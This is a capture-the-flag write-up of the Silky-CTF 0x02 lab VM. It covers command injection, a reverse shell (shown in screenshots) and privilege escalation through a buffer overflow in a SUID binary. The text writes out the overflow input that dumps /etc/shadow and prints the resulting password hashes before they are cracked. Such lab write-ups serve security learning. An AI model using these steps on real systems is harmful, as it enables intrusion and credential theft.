# Silky-CTF 0x02

## Nmap
````
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 17:02 WEST
Nmap scan report for 10.0.2.33
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 eb:74:50:5c:6f:57:04:15:bd:8c:57:ff:eb:a2:9f:58 (RSA)
|   256 97:50:40:64:05:4e:57:44:7d:31:a7:60:84:0a:9d:5c (ECDSA)
|_  256 fe:6e:fa:67:54:96:a7:bd:54:45:10:30:1c:20:c3:61 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
````

#

### Port 80
#### Default Apache page

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/02bcf962-fc1e-4fe8-a57c-6513d694080b)

#

#### Gobuster

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/85e64934-4d15-45cc-af37-6955be9e981b)

#

#### /admin.php

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/84cd50c0-28ae-48e6-b7d6-aa97120e10af)


After pressing 'login', this form appears. No default credentials. Let's try SQLi. And analyze that image a bit since it seems weird. Steganography maybe?

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/d2262e0a-2e1a-439b-ae48-747681a187b9)

Ran a bunch of tools against the image (strings, text editors, hexeditor, etc...) and nothing.

Got command injection on 'username' GET parameter!

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/e70a95d4-3e27-4ac9-b3e0-240e611a996f)

#

#### Reverse Shell

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/d4eabb79-c6f5-48ef-bef4-6096ca226afd)

#

### Privilege Escalation

There is an interesting file with the SUID bit in our home folder. It appears to be simply catting /etc/shadow, but I'll try running it with Pspy in parallel

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/a758ef7d-b151-4639-9ba8-8f82fe62c36f)

Pspy doesn't show anything, but the program itself has an interesting output

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/8fafa8f7-1bfe-4764-a32a-52b5ff281a88)

Strings is a bit confusing, so I exfiltrated the file to my attacker machine

````
base64 cat_shadow -w0
(copy to clipboard, paste to a file inside my machine)
base64 -d b64Cat_shadow > cat_shadow
````

### Testing the binary

I fired up ghidra but I got nothing especial. I then tried a super long password in order to cause a buffer overflow, and the output on the left finally changed to something, previously it was always 0x0

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/d877b364-026f-4d51-80fe-9ca3b20f5fcc)

So, I know what I have to do... And I found the position of the 4 characters that change the password

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/6363903a-9763-4cf6-982b-4b512a8a9d50)


Sending AAAA in the payload part outputs the following

``0x41414141 != 0x496c5962``

Well, it's hex to ascii. Just have to switch the bytes around...

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/fa1c1fb4-4c2c-48ff-903a-1aa5f403382a)
![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/cbfd53fc-1cb5-49c7-8366-c95fa41ea2a6)

And boom! This is on my system so that's why we got permission denied. Let's try it on the victim

````
www-data@Silky-CTF0x02:/home/silky$ ./cat_shadow 0000000000000000000000000000000000000000000000000000000000000000bYlI0000000
Trying to read /etc/shadow           
Succes      
Printing...
root:$6$L69RL59x$ONQl06MP37LfjyFBGlQ5TYtdDqEZEe0yIZIuTHASQG/dgH3Te0fJII/Wtdbu0PA3D/RTxJURc.Ses60j0GFyF/:18012:0:99999:7:::
daemon:*:18012:0:99999:7:::
bin:*:18012:0:99999:7:::
sys:*:18012:0:99999:7:::
sync:*:18012:0:99999:7:::
games:*:18012:0:99999:7:::
man:*:18012:0:99999:7:::
lp:*:18012:0:99999:7:::
mail:*:18012:0:99999:7:::
news:*:18012:0:99999:7:::
uucp:*:18012:0:99999:7:::
proxy:*:18012:0:99999:7:::
www-data:*:18012:0:99999:7:::
backup:*:18012:0:99999:7:::
list:*:18012:0:99999:7:::
irc:*:18012:0:99999:7:::
gnats:*:18012:0:99999:7:::
nobody:*:18012:0:99999:7:::
systemd-timesync:*:18012:0:99999:7:::
systemd-network:*:18012:0:99999:7:::
systemd-resolve:*:18012:0:99999:7:::
systemd-bus-proxy:*:18012:0:99999:7:::
_apt:*:18012:0:99999:7:::       
dnsmasq:*:18012:0:99999:7:::
avahi-autoipd:*:18012:0:99999:7:::
messagebus:*:18012:0:99999:7:::
usbmux:*:18012:0:99999:7:::
geoclue:*:18012:0:99999:7:::
speech-dispatcher:!:18012:0:99999:7:::
rtkit:*:18012:0:99999:7:::
pulse:*:18012:0:99999:7:::
avahi:*:18012:0:99999:7:::
colord:*:18012:0:99999:7:::
saned:*:18012:0:99999:7:::
Debian-gdm:*:18012:0:99999:7:::
hplip:*:18012:0:99999:7:::
silky:$6$F0T5vQMg$BKnwGPZ17UHvqZLOVFVCUh6CrsZ5Eu8BLT1/uX3h44wtEoDt9qA2dYL04CMUXHw2Km9H.tttNiyaCHwQQ..2T0:18012:0:99999:7:::
mysql:!:18012:0:99999:7:::
sshd:*:18012:0:99999:7:::
````

Let's unshadow and crack this. So I saved the important bits of /etc/shadow and /etc/passwd to my machine

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/fdeed623-9f36-4dc2-b20f-840a38882a3e)

And now we play the waiting game

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/61254f7c-3970-4226-a1d4-4d2ee4a9f7b5)

A few minutes later

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/509b80b2-c1a9-4a5d-83f3-da8b0e8684bb)

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/965711a5-e175-4531-8208-760a556cf98d)


Really fun CTF! But I'm not sure how this relates to the OSWE
